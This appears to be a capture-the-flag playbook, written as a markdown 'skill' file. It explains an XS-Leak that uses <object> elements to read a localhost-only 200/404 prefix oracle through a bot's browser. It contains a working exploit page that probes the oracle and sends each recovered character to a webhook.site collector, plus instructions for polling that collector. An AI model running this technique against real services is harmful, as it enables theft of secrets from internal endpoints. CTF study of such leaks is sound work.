---
name: xs-leak-object-element-oracle
description: "Localhost 200/404 oracle + bot-visits-URLs: leak via object."
---

# XS-Leak: cross-origin <object> element status oracle

Extract data from a same-network/localhost-only HTTP endpoint (a prefix/boolean
oracle returning 200 vs 404) by making a headless bot visit a `data:` URL page
that probes the oracle with `<object type="text/html">` elements and exfiltrates
which one fired `onload`. Works even when the oracle response is `text/html`
with `X-Content-Type-Options: nosniff`.

## When to use

- Challenge has a bot (`/report`, `/osha-see`, `/visit`) that navigates to ANY
  URL we submit, and an endpoint that answers 200/404 depending on a secret
  (prefix oracle, existence check, boolean condition).
- The oracle rejects non-localhost clients (`req.socket.remoteAddress` check)
  so it can only be queried from the bot's browser.
- The endpoint we must probe returns non-image, non-JS content.

## Why object, not script/img

Under `nosniff`, probing a `text/html` 200/404 endpoint cross-origin:

| Element            | 200             | 404             | Verdict |
|--------------------|-----------------|-----------------|---------|
| `<script src>`     | onerror (MIME-blocked) | onerror | ✗ same |
| `<img src>`        | onerror (not an image) | onerror | ✗ same |
| `<link rel=stylesheet>` | onerror (MIME-blocked) | onerror | ✗ same |
| `<iframe src>`     | onload          | onload (error page still loads) | ✗ same |
| `<object type="text/html" data=...>` | **onload fires** | **no onload** | ✓ |

Objects load like a navigation (nosniff does not apply) but, unlike iframes,
a 404 response does not fire the load event. Verified empirically in Chrome 123
(puppeteer 22.6.1).

## Steps

1. **Read the source.** Find the oracle route, the bot (`page.goto(url)` —
   check waitUntil/timeout), and the response headers (`nosniff`, CSP).
   Confirm the oracle logic (e.g. `for i in range(len(flag)): if flag[i]!=secret[i] break`
   → prefix oracle) and the alphabet (often revealed by `fs.existsSync('<char>.png')`
   checks or image files).
2. **Test locally first** (challenge usually says so): run the app replica with
   the EXACT pinned dependency versions, and drive it with the bot's exact
   Chrome (`~/.cache/puppeteer/chrome/linux-*/chrome-linux64/chrome`).
   Pitfall: the system Chrome is often much newer (150+) and enforces
   Private Network Access — it blocks data:-page → 127.0.0.1 subresources.
   The pinned bot Chrome (e.g. 123) does not. Always test with the bot's Chrome.
3. **Exploit page** (data: URL — full JS, no CSP, opaque origin; note
   `document.body` is NULL at parse time — append to `document.documentElement`):
   ```html
   <script>
   var W='https://webhook.site/TOKEN/?r=';      // exfil collector
   var alpha='ABCDEFGHIJKLMNOPQRSTUVWXYZ24!_{}';// oracle alphabet
   var prefix='EQCTF{';                          // known prefix so far
   var found=null;
   function probe(c){
     var o=document.createElement('object');
     o.type='text/html';
     o.onload=function(){found=c;};
     o.data='http://127.0.0.1:PORT/oracle?flag='+prefix+c;
     document.documentElement.appendChild(o);
   }
   for(var i=0;i<alpha.length;i++)probe(alpha[i]);
   setTimeout(function(){new Image().src=W+'pos='+prefix.length+'&c='+(found||'NONE');},2200);
   </script>
   ```
   Submit `data:text/html,` + encodeURIComponent(html) to the bot endpoint.
   Exactly ONE probe fires onload (the correct next char); all others 404.
4. **Collect results**: webhook.site (`POST https://webhook.site/token` →
   uuid; read `GET https://webhook.site/token/<uuid>/requests?sorting=newest`).
   One bot visit per position (32 parallel probes fit in the usual 3 s window).
   Retry once on `NONE` to distinguish transient failure from end-of-secret.
5. Repeat until all probes 404 → secret complete.

## Pitfalls

- `X-Content-Type-Options: nosniff` kills script/img/css probes on text/html
  bodies — don't waste time; go straight to object.
- PNA (Private Network Access): newer Chrome blocks public/opaque → private
  (127.0.0.1) subresource loads. If local tests fail but the pinned bot version
  is old, retest with the bot's exact Chrome. If the remote bot's Chrome is
  new (131+), you need the exploit page served from the SAME host/address
  space as the oracle instead of a data: URL.
- `data:` documents have no `<body>` when inline scripts run — use
  `document.documentElement.appendChild`.
- The bot may queue visits and sleep ~3 s after load — budget probe time per
  visit; parallelize all candidates of one position per visit.
- Objects fall back (render fallback content) on BOTH 200 and 404 when the
  body isn't renderable — ignore fallback, key on `object.onload`.
- If the oracle's 200 body is a real image (e.g. `image/png`), plain `<img>`
  onload/onerror also works and is simpler.

## Verification

Run the full extraction against the live instance (or a local replica with a
known secret). Confirm the recovered string matches the expected secret/format,
and that end-detection (all-404 round) triggers after the final character.
